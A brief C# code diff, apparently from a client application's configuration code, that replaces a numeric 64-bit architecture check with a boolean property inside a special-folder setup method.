@@ -65,7 +65,7 @@ namespace xClient.Config
 
         static void FixSpecialFolder()
         {
-            if (PlatformHelper.Architecture == 64) return;
+            if (PlatformHelper.Is64Bit) return;
 
             // https://msdn.microsoft.com/en-us/library/system.environment.specialfolder(v=vs.110).aspx
             switch (SPECIALFOLDER)
